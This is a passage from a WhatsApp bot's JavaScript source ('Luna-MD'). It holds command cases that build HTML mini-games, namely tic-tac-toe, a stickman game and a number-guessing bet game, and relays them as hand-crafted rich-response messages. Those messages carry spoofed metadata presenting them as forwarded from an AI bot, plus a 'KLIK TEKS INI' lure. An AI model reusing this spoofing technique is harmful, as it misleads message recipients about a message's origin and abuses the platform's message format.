      winsYou++;
      pickYouEl.classList.add('win');

      if (cfg.digits === 4) {
        playJackpot();
        text = '🎉🎉 JACKPOT 4D! PERSIS ' + pad(finalNumber, 4) + ' · +' + reward + ' duit!';
        cls = 'jackpot';
      } else {
        playWin();
        text = '🎯 MENANG! ' + cfg.label + ' PERSIS ' + pad(finalNumber, cfg.digits) + ' · +' + reward + ' duit!';
        cls = 'win';
      }
    } else {
      playLose();
      if (aiWin) {
        winsAI++;
        pickAIEl.classList.add('win');
        text = '💀 Luna PERSIS ' + pad(finalNumber, cfg.digits) + '! Kamu kalah -' + TARUHAN;
      } else {
        text = '❌ Tidak ada yang persis! Angka keluar ' + pad(finalNumber, cfg.digits) + ' · -' + TARUHAN + ' duit';
      }
      cls = 'lose';
    }

    updateStats();
    flashMoney();
    setMsg(text, cls);
    kocokBtn.classList.remove('show');
    resetBtn.classList.add('show');

    if (money < TARUHAN) {
      setTimeout(showBankrupt, 1800);
    }
  }

  function showBankrupt() {
    modalIcon.textContent = '💀';
    modalTitle.textContent = 'BANGKRUT!';
    modalText.textContent = 'Duit kamu habis. Mau main lagi dengan 1000 duit?';
    mRonde.textContent = round;
    mMenang.textContent = winsYou;
    mKalah.textContent = winsAI;
    modal.classList.add('show');
    playLose();
  }

  function resetAll() {
    money = 1000;
    round = 0;
    winsYou = 0;
    winsAI = 0;
    modal.classList.remove('show');
    updateStats();
    resetRound();
    setMsg('💰 Duit direset ke 1000! Selamat main lagi!', 'info');
  }

  playBtn.addEventListener('click', handlePlay);
  kocokBtn.addEventListener('click', kocok);
  resetBtn.addEventListener('click', () => {
    playClick();
    if (money < TARUHAN) {
      resetAll();
    } else {
      resetRound();
    }
  });
  modalBtn.addEventListener('click', () => {
    playClick();
    resetAll();
  });

  guessInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); handlePlay(); } });
  guessInput.addEventListener('input', () => { guessInput.value = guessInput.value.replace(/\D/g, ''); });

  levelBtns.forEach((btn) => {
    btn.addEventListener('click', () => {
      if (busy) return;
      mode = btn.dataset.level;
      levelBtns.forEach((b) => b.classList.remove('active'));
      btn.classList.add('active');
      playClick();
      updateRateBar();
      setMsg('🎯 Mode ' + MODES[mode].label + ' · bayaran ' + MODES[mode].hadiah, 'info');
      setTimeout(() => {
        updateVisibleDigits();
        resetRound();
      }, 150);
    });
  });

  startGame();
})();
</script>

</body>
</html>
    `;

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break
    
case "ttc":
case "tictactoe":
case "ttt":
case "tic-tac-toe": {
const html = String.raw`
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Luna-MD Tic Tac Toe</title>
<style>
:root{--bg:#151816;--bg2:#1b1e1a;--panel:#232722;--panel2:#292e28;--panel3:#30362f;--line:#414840;--ink:#e1e2d9;--muted:#969e95;--olive:#a7b59f;--olive2:#3f4b41;--bronze:#8e7757;--bronze2:#5b4c3a;--board:#514432;--cell:#d0c4a8;--cell2:#bdb091;--x:#718b7b;--o:#b77d69;--gold:#b79b61;--shadow:#0b0d0c}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;min-height:100%;background:radial-gradient(circle at 50% -20%,#2a3029 0,#1c201d 34%,#141715 72%);color:var(--ink);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{padding:10px}.app{width:min(100%,560px);margin:auto}
.header{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:9px}.brand{display:flex;align-items:center;gap:10px;min-width:0}.mark{width:44px;height:44px;flex:0 0 auto;border-radius:13px;display:grid;place-items:center;background:linear-gradient(145deg,#343a33,#222720);border:1px solid #454c44;box-shadow:6px 6px 12px var(--shadow),-3px -3px 8px #33392f;color:#ddd9cb;font:500 21px/1 Georgia,"Times New Roman",serif}.title{font-size:20px;font-weight:900;letter-spacing:-.35px}.sub{margin-top:2px;color:var(--muted);font-size:9.5px;line-height:1.35}.status{padding:7px 9px;border-radius:11px;border:1px solid var(--line);background:linear-gradient(145deg,#2c322c,#20251f);box-shadow:4px 4px 8px var(--shadow),-2px -2px 6px #30352e;font-size:9px;font-weight:900;white-space:nowrap}
.topControls{display:grid;grid-template-columns:minmax(0,1fr) minmax(145px,.72fr);gap:7px;margin-bottom:8px}.select,.btn{width:100%;min-height:42px;border:1px solid var(--line);border-radius:12px;background:linear-gradient(145deg,#2b302a,#20241f);color:var(--ink);font:800 10.5px/1 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;outline:0;box-shadow:4px 4px 8px var(--shadow),-2px -2px 6px #30352e}.select{padding:0 10px}.btn{padding:0 10px;cursor:pointer;touch-action:manipulation}.btn:active{transform:translateY(1px);box-shadow:inset 2px 2px 5px #121512,inset -2px -2px 4px #343a32}.btn.primary{background:linear-gradient(145deg,#3b4840,#2a322c);border-color:#56655b;color:#e4eadf}.btn.olive{background:linear-gradient(145deg,#344039,#273129);border-color:#4a5b50}.btn.warm{background:linear-gradient(145deg,#4a3c31,#352c25);border-color:#635145}
.game{padding:10px;border:1px solid #394038;border-radius:18px;background:linear-gradient(145deg,rgba(43,48,42,.97),rgba(31,35,30,.98));box-shadow:9px 10px 22px var(--shadow),-4px -4px 10px #2b302a}
.roundLine{display:flex;align-items:center;justify-content:space-between;gap:10px;margin:0 2px 8px}.round{display:flex;align-items:center;gap:7px;text-transform:uppercase;letter-spacing:.7px;font-size:9px;font-weight:950}.dot{width:8px;height:8px;border-radius:50%;background:var(--olive);box-shadow:0 0 0 4px #354137}.turn{font-size:9px;color:var(--muted);text-align:right}
.boardFrame{width:min(100%,470px);margin:auto;padding:9px;border:1px solid #79674e;border-radius:18px;background:linear-gradient(145deg,#68563f,#463a2d);box-shadow:inset 2px 2px 4px #7b694f,inset -3px -3px 6px #362d22,8px 10px 18px #11140f}.board{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;padding:7px;width:100%;aspect-ratio:1;border-radius:13px;background:linear-gradient(145deg,#4d3f30,#5b4937);box-shadow:inset 3px 3px 7px #33291f,inset -2px -2px 5px #6a5641}.cell{position:relative;display:grid;place-items:center;min-width:0;border:1px solid #94876f;border-radius:11px;background:linear-gradient(145deg,var(--cell),var(--cell2));box-shadow:4px 4px 7px #392f26,-2px -2px 5px #79674f;cursor:pointer;touch-action:manipulation;transition:transform .1s ease,filter .1s ease,box-shadow .1s ease}.cell:active{transform:translateY(1px);box-shadow:2px 2px 4px #392f26,-1px -1px 3px #79674f}.cell.locked{cursor:default}.cell.empty .symbol{opacity:0}.cell.x{color:var(--x)}.cell.o{color:var(--o)}.symbol{font:500 clamp(39px,13vw,72px)/.9 Georgia,"Times New Roman",serif;text-shadow:0 1px 0 #eee5d2,0 2px 2px #8f836c}.cell.win{filter:saturate(1.08);box-shadow:inset 0 0 0 2px var(--gold),4px 4px 7px #392f26,-2px -2px 5px #79674f}.cell.hint{box-shadow:inset 0 0 0 2px var(--olive),4px 4px 7px #392f26,-2px -2px 5px #79674f}.cell[data-num]:before{content:attr(data-num);position:absolute;top:5px;left:6px;color:#756b59;font:800 7px/1 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;opacity:.75}
.score{display:grid;grid-template-columns:repeat(4,1fr);gap:7px;margin-top:8px}.stat{min-width:0;padding:8px 5px;border:1px solid var(--line);border-radius:12px;background:linear-gradient(145deg,#2e342e,#222722);box-shadow:3px 3px 7px var(--shadow),-2px -2px 5px #31372f;text-align:center}.stat b{display:block;font-size:15px;line-height:1.05}.stat span{display:block;margin-top:3px;color:var(--muted);font-size:7px;text-transform:uppercase;letter-spacing:.55px}
.turnBar{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-top:8px}.player{display:flex;align-items:center;justify-content:space-between;gap:8px;padding:9px 10px;border-radius:12px;border:1px solid var(--line);background:linear-gradient(145deg,#2d332d,#232823);box-shadow:3px 3px 7px var(--shadow),-2px -2px 5px #31372f}.player.active{border-color:#5b6d60;box-shadow:inset 0 0 0 1px #536358,3px 3px 7px var(--shadow),-2px -2px 5px #31372f}.pname{font-size:9.5px;font-weight:900}.psub{margin-top:3px;color:var(--muted);font-size:7.8px}.badge{width:27px;height:27px;border-radius:9px;display:grid;place-items:center;font:900 11px/1 Georgia,"Times New Roman",serif;box-shadow:inset 1px 1px 2px #3b4039,inset -1px -1px 2px #171a16}.badge.x{background:#3e5146;color:#dce8de}.badge.o{background:#5a4139;color:#f1ddd5}
details.tools{margin-top:8px;border:1px solid var(--line);border-radius:12px;background:linear-gradient(145deg,#2c312c,#222721);box-shadow:3px 3px 7px var(--shadow),-2px -2px 5px #31372f;overflow:hidden}details.tools summary{list-style:none;cursor:pointer;padding:10px 11px;font-size:9px;font-weight:900;user-select:none}details.tools summary::-webkit-details-marker{display:none}.toolBody{padding:0 9px 9px;display:grid;grid-template-columns:repeat(2,1fr);gap:7px}.toolBody .btn{min-height:39px;font-size:9px;box-shadow:3px 3px 6px var(--shadow),-2px -2px 4px #30362f}.note{margin-top:8px;padding:8px 9px;border:1px solid #3e453d;border-radius:11px;background:#20251f;color:#929a92;text-align:center;font-size:8px;line-height:1.4}
.overlay{position:fixed;inset:0;z-index:30;display:none;align-items:center;justify-content:center;padding:15px;background:rgba(9,11,9,.78)}.overlay.show{display:flex}.modal{width:min(92vw,400px);padding:18px;border:1px solid #4a5149;border-radius:18px;background:linear-gradient(145deg,#30362f,#20251f);box-shadow:10px 12px 25px #080908,-5px -5px 12px #343a32;text-align:center}.modalIcon{width:58px;height:58px;margin:0 auto 8px;border-radius:17px;display:grid;place-items:center;background:linear-gradient(145deg,#3d463d,#283028);border:1px solid #4c574e;box-shadow:6px 6px 11px var(--shadow),-3px -3px 8px #3a4038;font:500 34px/1 Georgia,"Times New Roman",serif}.modal h2{margin:3px 0;font-size:22px}.modal p{margin:7px 0 13px;color:var(--muted);font-size:9.5px;line-height:1.45}.result{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin-bottom:11px}.result div{padding:8px;border:1px solid var(--line);border-radius:11px;background:linear-gradient(145deg,#2e342e,#222722)}.result b{display:block;font-size:15px}.result span{font-size:7.5px;color:var(--muted);text-transform:uppercase}.modalBtns{display:grid;grid-template-columns:1fr 1fr;gap:7px}.toast{position:fixed;left:50%;bottom:76px;z-index:40;max-width:88vw;padding:8px 10px;border:1px solid #4a5249;border-radius:10px;background:#282e28;color:#e4e5de;font-size:8.5px;font-weight:900;box-shadow:6px 7px 12px #090b09,-3px -3px 7px #353b34;transform:translate(-50%,10px);opacity:0;pointer-events:none;transition:opacity .12s ease,transform .12s ease}.toast.show{opacity:1;transform:translate(-50%,0)}
@media(max-width:420px){body{padding:7px}.header{gap:8px}.mark{width:41px;height:41px}.title{font-size:18px}.sub{font-size:8.7px}.status{font-size:8px;padding:7px 8px}.game{padding:8px;border-radius:16px}.boardFrame{padding:8px;border-radius:16px}.board{gap:6px;padding:6px}.cell{border-radius:10px}.score,.turnBar,.toolBody{gap:6px}.stat{padding:7px 4px}.stat span{font-size:6.6px}.player{padding:8px 9px}.pname{font-size:9px}.psub{font-size:7.2px}}
@media(max-width:340px){.topControls{grid-template-columns:1fr}.status{display:none}.score{grid-template-columns:1fr 1fr}.turnBar{grid-template-columns:1fr}.toolBody{grid-template-columns:1fr}.title{font-size:17px}}
@media(prefers-reduced-motion:reduce){*{transition:none!important}}
</style>
</head>
<body>
<div class="app">
<div class="header"><div class="brand"><div class="mark">✕○</div><div><div class="title">Tic Tac Toe</div><div class="sub">Ruang kecil, papan tegas, langkah tanpa ramai.</div></div></div><div class="status" id="status">Giliran X</div></div>
<div class="topControls"><select id="mode" class="select" aria-label="Mode permainan"><option value="easy">Santai · Luna mudah</option><option value="normal" selected>Seimbang · Luna normal</option><option value="hard">Tajam · Luna sulit</option><option value="pvp">2 Pemain · Lokal</option></select><button id="newGame" class="btn primary" type="button">＋ Permainan Baru</button></div>
<div class="game">
<div class="roundLine"><div class="round"><span class="dot"></span><span id="roundText">Ronde 1</span></div><div class="turn" id="turnText">X sedang bermain</div></div>
<div class="boardFrame"><div id="board" class="board" aria-label="Papan Tic Tac Toe"></div></div>
<div class="score"><div class="stat"><b id="scoreX">0</b><span>X Menang</span></div><div class="stat"><b id="scoreO">0</b><span>O Menang</span></div><div class="stat"><b id="scoreD">0</b><span>Seri</span></div><div class="stat"><b id="moves">0</b><span>Langkah</span></div></div>
<div class="turnBar"><div class="player active" id="playerX"><div><div class="pname" id="nameX">Kamu</div><div class="psub" id="subX">Giliran aktif</div></div><div class="badge x">X</div></div><div class="player" id="playerO"><div><div class="pname" id="nameO">Luna</div><div class="psub" id="subO">Menunggu</div></div><div class="badge o">O</div></div></div>
<details class="tools"><summary>Pengaturan & alat</summary><div class="toolBody"><button id="undo" class="btn olive" type="button">↶ Urungkan</button><button id="swap" class="btn" type="button">⇄ Tukar Sisi</button><button id="hint" class="btn" type="button">◌ Petunjuk</button><button id="sound" class="btn warm" type="button">♪ Suara: Mati</button><button id="resetScore" class="btn" type="button">↻ Reset Skor</button></div></details>
<div class="note" id="note">Tap kotak kosong untuk bermain. 1–9 dari keyboard juga bisa dipakai.</div>
</div>
</div>
<div id="overlay" class="overlay" role="dialog" aria-modal="true" aria-labelledby="resultTitle"><div class="modal"><div class="modalIcon" id="resultIcon">✕</div><h2 id="resultTitle">Selesai</h2><p id="resultText">Ronde selesai.</p><div class="result"><div><b id="resultX">0</b><span>X</span></div><div><b id="resultO">0</b><span>O</span></div><div><b id="resultDraw">0</b><span>Seri</span></div></div><div class="modalBtns"><button id="playAgain" class="btn primary" type="button">Main Lagi</button><button id="closeModal" class="btn" type="button">Tutup</button></div></div></div>
<div id="toast" class="toast" aria-live="polite"></div>
<script>
const $=id=>document.getElementById(id);const boardEl=$('board'),modeEl=$('mode'),statusEl=$('status'),roundText=$('roundText'),turnText=$('turnText'),scoreXEl=$('scoreX'),scoreOEl=$('scoreO'),scoreDEl=$('scoreD'),movesEl=$('moves'),nameXEl=$('nameX'),nameOEl=$('nameO'),subXEl=$('subX'),subOEl=$('subO'),playerXEl=$('playerX'),playerOEl=$('playerO'),noteEl=$('note'),overlay=$('overlay'),resultIcon=$('resultIcon'),resultTitle=$('resultTitle'),resultText=$('resultText'),resultX=$('resultX'),resultO=$('resultO'),resultDraw=$('resultDraw'),toast=$('toast');
const WIN_LINES=[[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];const SCORE_KEY='luna-ttt-score-v2',SETTINGS_KEY='luna-ttt-settings-v2';let board=Array(9).fill(''),turn='X',human='X',ai='O',mode='normal',round=0,history=[],gameOver=false,busy=false,winningLine=[],hintCell=-1,soundOn=false,audioCtx=null,score={X:0,O:0,D:0},gameToken=0,aiTimer=null;
function loadState(){try{const saved=JSON.parse(localStorage.getItem(SCORE_KEY)||'null');if(saved&&Number.isFinite(saved.X)&&Number.isFinite(saved.O)&&Number.isFinite(saved.D))score={X:Math.max(0,saved.X),O:Math.max(0,saved.O),D:Math.max(0,saved.D)};const cfg=JSON.parse(localStorage.getItem(SETTINGS_KEY)||'null');if(cfg&&['easy','normal','hard','pvp'].includes(cfg.mode))mode=cfg.mode;if(cfg&&['X','O'].includes(cfg.human))human=cfg.human;soundOn=Boolean(cfg&&cfg.soundOn)}catch{score={X:0,O:0,D:0}}
}
function saveState(){try{localStorage.setItem(SCORE_KEY,JSON.stringify(score));localStorage.setItem(SETTINGS_KEY,JSON.stringify({mode,human,soundOn}))}catch{}}
function opponent(p){return p==='X'?'O':'X'}function emptyCells(b){const out=[];for(let i=0;i<9;i++)if(!b[i])out.push(i);return out}
function checkResult(b){for(const line of WIN_LINES){const[a,c,d]=line;if(b[a]&&b[a]===b[c]&&b[a]===b[d])return{winner:b[a],line}}return emptyCells(b).length?null:{winner:'D',line:[]}}
function lineFor(b,p){for(const line of WIN_LINES){const[a,c,d]=line;const vals=[b[a],b[c],b[d]];if(vals.filter(v=>v===p).length===2&&vals.filter(v=>v==='').length===1)return line.find(i=>!b[i])}return-1}
function winningMove(b,p){return lineFor(b,p)}function centerOrCorner(b){if(!b[4])return 4;const corners=[0,2,6,8].filter(i=>!b[i]);if(corners.length)return corners[Math.floor(Math.random()*corners.length)];return emptyCells(b)[0]??-1}
function minimax(b,player,depth,alpha,beta){const result=checkResult(b);if(result){if(result.winner===ai)return 10-depth;if(result.winner===human)return depth-10;return 0}const moves=emptyCells(b);if(!moves.length)return 0;if(player===ai){let best=-Infinity;for(const move of moves){b[move]=ai;best=Math.max(best,minimax(b,human,depth+1,alpha,beta));b[move]='';alpha=Math.max(alpha,best);if(beta<=alpha)break}return best}let best=Infinity;for(const move of moves){b[move]=human;best=Math.min(best,minimax(b,ai,depth+1,alpha,beta));b[move]='';beta=Math.min(beta,best);if(beta<=alpha)break}return best}
function bestMove(b){const moves=emptyCells(b);if(!moves.length)return-1;let bestScore=-Infinity,best=moves[0];for(const move of moves){b[move]=ai;const value=minimax(b,human,0,-Infinity,Infinity);b[move]='';if(value>bestScore){bestScore=value;best=move}}return best}
function chooseAiMove(){const empty=emptyCells(board);if(!empty.length)return-1;if(mode==='easy'){const win=winningMove(board,ai);if(win>=0&&Math.random()<.62)return win;const block=winningMove(board,human);if(block>=0&&Math.random()<.48)return block;return empty[Math.floor(Math.random()*empty.length)]}if(mode==='normal'){const win=winningMove(board,ai);if(win>=0)return win;const block=winningMove(board,human);if(block>=0)return block;if(!board[4])return 4;return centerOrCorner(board)}return bestMove(board)}
function aiMove(){if(gameOver||busy||mode==='pvp'||turn!==ai)return;busy=true;hintCell=-1;render();const token=gameToken,move=chooseAiMove();window.clearTimeout(aiTimer);aiTimer=window.setTimeout(()=>{if(token!==gameToken){busy=false;render();return}if(!gameOver&&turn===ai&&move>=0&&board[move]==='')place(move,ai,true);busy=false;render()},mode==='hard'?110:75)}
function place(index,player,fromAi=false){if(gameOver||(busy&&!fromAi)||index<0||index>8||board[index])return false;if(turn!==player)return false;history.push(board.slice());board[index]=player;hintCell=-1;playSound('move');const result=checkResult(board);if(result){winningLine=result.line;gameOver=true;if(result.winner==='D')score.D+=1;else score[result.winner]+=1;saveState();render();showResult(result.winner);return true}turn=opponent(turn);render();if(mode!=='pvp'&&turn===ai)aiMove();return true}
function determineTurn(){const x=board.filter(v=>v==='X').length,o=board.filter(v=>v==='O').length;return x===o?'X':'O'}
function undo(){if(!history.length||gameOver||busy)return;const steps=mode==='pvp'?1:Math.min(2,history.length);for(let i=0;i<steps;i++)board=history.pop();turn=determineTurn();hintCell=-1;render();showToast(steps>1?'Dua langkah diurungkan.':'Satu langkah diurungkan.')}
function newRound(){gameToken+=1;window.clearTimeout(aiTimer);aiTimer=null;board=Array(9).fill('');turn='X';ai=opponent(human);if(mode==='pvp'){human='X';ai='O'}history=[];gameOver=false;busy=false;winningLine=[];hintCell=-1;overlay.classList.remove('show');round+=1;updateNames();render();if(mode!=='pvp'&&turn===ai)aiMove()}
function toggleSides(){if(mode==='pvp'){showToast('Tukar sisi hanya tersedia saat melawan Luna.');return}human=opponent(human);ai=opponent(human);saveState();newRound();showToast('Sisi ditukar. Kamu sekarang '+human+'.')}
function setMode(next){mode=next;if(mode==='pvp'){human='X';ai='O'}saveState();newRound();showToast(next==='pvp'?'Mode 2 pemain aktif.':'Mode '+({easy:'Santai',normal:'Seimbang',hard:'Tajam'}[next])+' aktif.')}
function resetScore(){score={X:0,O:0,D:0};saveState();render();showToast('Skor direset.')}
function giveHint(){if(gameOver||busy||turn!==human){showToast('Petunjuk tersedia saat giliran kamu.');return}let move=winningMove(board,human);if(move<0)move=winningMove(board,ai);if(move<0)move=mode==='hard'?bestMove(board):centerOrCorner(board);if(move<0){showToast('Belum ada langkah yang tersedia.');return}hintCell=move;render();showToast('Kotak berbingkai adalah petunjuk.')}
function updateNames(){nameXEl.textContent=mode==='pvp'?'Pemain X':human==='X'?'Kamu':'Luna';nameOEl.textContent=mode==='pvp'?'Pemain O':human==='O'?'Kamu':'Luna'}
function render(){boardEl.innerHTML='';for(let i=0;i<9;i++){const cell=document.createElement('button');cell.type='button';cell.className='cell '+(board[i]?board[i].toLowerCase():'empty');cell.dataset.pos=i;cell.dataset.num=i+1;cell.setAttribute('aria-label','Kotak '+(i+1)+(board[i]?' berisi '+board[i]:' kosong'));if(winningLine.includes(i))cell.classList.add('win');if(hintCell===i&&!board[i])cell.classList.add('hint');if(gameOver||busy||board[i]||(turn!==human&&mode!=='pvp'))cell.classList.add('locked');const symbol=document.createElement('span');symbol.className='symbol';symbol.textContent=board[i]||'';cell.appendChild(symbol);cell.addEventListener('click',()=>{if(mode==='pvp'||turn===human)place(i,turn)});boardEl.appendChild(cell)}statusEl.textContent=gameOver?'Ronde selesai':busy?'Luna berpikir':'Giliran '+turn;turnText.textContent=gameOver?'Ronde selesai':busy?'Luna sedang berpikir':(turn===human?'Kamu ('+turn+') sedang bermain':(mode==='pvp'?'Pemain '+turn+' sedang bermain':'Luna ('+turn+') sedang bermain'));roundText.textContent='Ronde '+round;scoreXEl.textContent=score.X;scoreOEl.textContent=score.O;scoreDEl.textContent=score.D;movesEl.textContent=9-emptyCells(board).length;subXEl.textContent=gameOver?'Selesai':turn==='X'?'Giliran aktif':'Menunggu';subOEl.textContent=gameOver?'Selesai':turn==='O'?'Giliran aktif':'Menunggu';playerXEl.classList.toggle('active',turn==='X'&&!gameOver);playerOEl.classList.toggle('active',turn==='O'&&!gameOver);noteEl.textContent=mode==='pvp'?'Dua pemain berbagi satu perangkat.': 'Kamu bermain sebagai '+human+'. Luna mengikuti tingkat '+({easy:'Santai',normal:'Seimbang',hard:'Tajam'}[mode])+'.';$('sound').textContent='♪ Suara: '+(soundOn?'Nyala':'Mati');$('undo').disabled=!history.length||gameOver||busy;updateNames()}
function showResult(winner){resultX.textContent=score.X;resultO.textContent=score.O;resultDraw.textContent=score.D;if(winner==='D'){resultIcon.textContent='≈';resultTitle.textContent='Seri';resultText.textContent='Semua kotak terisi. Ronde ini berakhir tanpa pemenang.';playSound('draw')}else{const who=mode==='pvp'?'Pemain '+winner:winner===human?'Kamu':'Luna';resultIcon.textContent=winner==='X'?'✕':'○';resultTitle.textContent=who+' menang';resultText.textContent='Tiga tanda bertemu dalam satu garis. Papan siap untuk ronde berikutnya.';playSound('win')}window.setTimeout(()=>overlay.classList.add('show'),80)}
function showToast(text){toast.textContent=text;toast.classList.add('show');window.clearTimeout(showToast.timer);showToast.timer=window.setTimeout(()=>toast.classList.remove('show'),1400)}
function playSound(type){if(!soundOn)return;try{audioCtx=audioCtx||(new(window.AudioContext||window.webkitAudioContext)());if(audioCtx.state==='suspended')audioCtx.resume();const o=audioCtx.createOscillator(),g=audioCtx.createGain(),now=audioCtx.currentTime,freq=type==='win'?720:type==='draw'?430:540;o.frequency.setValueAtTime(freq,now);o.frequency.exponentialRampToValueAtTime(type==='win'?920:370,now+.08);o.type=type==='move'?'sine':'triangle';g.gain.setValueAtTime(.04,now);g.gain.exponentialRampToValueAtTime(.001,now+.11);o.connect(g);g.connect(audioCtx.destination);o.start(now);o.stop(now+.11)}catch{}}
function keyHandler(e){if(e.key>='1'&&e.key<='9'&&!gameOver&&!busy){const idx=Number(e.key)-1;if(board[idx]===''&&(mode==='pvp'||turn===human))place(idx,turn);return}if(e.key.toLowerCase()==='r')newRound();if(e.key.toLowerCase()==='u')undo();if(e.key==='Escape')overlay.classList.remove('show')}
$('newGame').onclick=newRound;$('undo').onclick=undo;$('swap').onclick=toggleSides;$('sound').onclick=()=>{soundOn=!soundOn;saveState();render();if(soundOn)playSound('move')};$('resetScore').onclick=resetScore;$('hint').onclick=giveHint;$('playAgain').onclick=newRound;$('closeModal').onclick=()=>overlay.classList.remove('show');modeEl.onchange=e=>setMode(e.target.value);document.addEventListener('keydown',keyHandler);loadState();modeEl.value=mode;updateNames();newRound();
</script>
</body>
</html>
    `;

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break


case "stickman": {
const html = `<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>Stickman 3D</title><style>
*{box-sizing:border-box;user-select:none;-webkit-user-select:none;margin:0;padding:0}html,body{width:100%;height:100%;overflow:hidden;background:#050508;font-family:Segoe UI,Roboto,Arial,sans-serif;color:#fff}#game{position:relative;width:100vw;height:100vh;max-width:480px;max-height:854px;margin:auto;overflow:hidden;background:linear-gradient(#1a1c29,#2b2e42 42%,#151621)}canvas{width:100%;height:100%;display:block}#hud{position:absolute;top:0;left:0;width:100%;padding:10px 12px;z-index:5;background:linear-gradient(#000b,transparent);pointer-events:none}.top{display:flex;justify-content:space-between;align-items:center}.profile{display:flex;align-items:center;gap:8px}.avatar{width:42px;height:42px;border-radius:50%;border:2px solid #e74c3c;background:#222;display:grid;place-items:center;font-size:11px;font-weight:900;color:#ff5b5b}.bars{width:125px;display:grid;gap:4px}.bar{height:12px;border-radius:7px;background:#0009;border:1px solid #ffffff33;overflow:hidden;position:relative}.fill{height:100%;transition:width .15s}.hp{background:linear-gradient(90deg,#ff416c,#ff4b2b)}.xp{background:linear-gradient(90deg,#3a7bd5,#3a57e8)}.bt{position:absolute;inset:0;display:grid;place-items:center;font-size:8px;font-weight:800;text-shadow:1px 1px 2px #000}.currency{font-size:11px;font-weight:800;background:#0007;border:1px solid #fff1;padding:5px 8px;border-radius:12px}.watermark{position:absolute;top:58px;left:12px;font-size:10px;color:#fff8;letter-spacing:1px}.combo{position:absolute;right:15px;top:70px;text-align:right;opacity:0;transition:.2s;z-index:4}.combo b{font-size:28px;font-style:italic;text-shadow:0 0 10px #f39c12,2px 2px #000}.combo small{display:block;color:#f1c40f;letter-spacing:2px}.controls{position:absolute;bottom:0;left:0;width:100%;height:220px;padding:15px;display:flex;justify-content:space-between;align-items:flex-end;z-index:6;pointer-events:none}.group{display:flex;gap:10px;align-items:flex-end;pointer-events:auto}.btn{border:2px solid #fff5;background:#0008;color:#fff;display:grid;place-items:center;font-weight:900;box-shadow:0 4px 10px #0008;backdrop-filter:blur(4px);touch-action:manipulation}.dir{width:55px;height:55px;border-radius:16px;font-size:20px}.atk{width:70px;height:70px;border-radius:50%;background:#e74c3c66;border-color:#e74c3caa;font-size:25px}.skills{display:grid;grid-template-columns:repeat(2,48px);gap:10px}.skill{width:48px;height:48px;border-radius:50%;background:#3498db66;border-color:#3498dbaa;font-size:14px}.btn:active{transform:scale(.92);background:#fff4}.modal{position:absolute;inset:0;background:#000d;display:flex;align-items:center;justify-content:center;z-index:20;backdrop-filter:blur(7px)}.card{width:82%;padding:25px;text-align:center;border-radius:16px;background:#1e2230;border:2px solid #e74c3c;box-shadow:0 0 25px 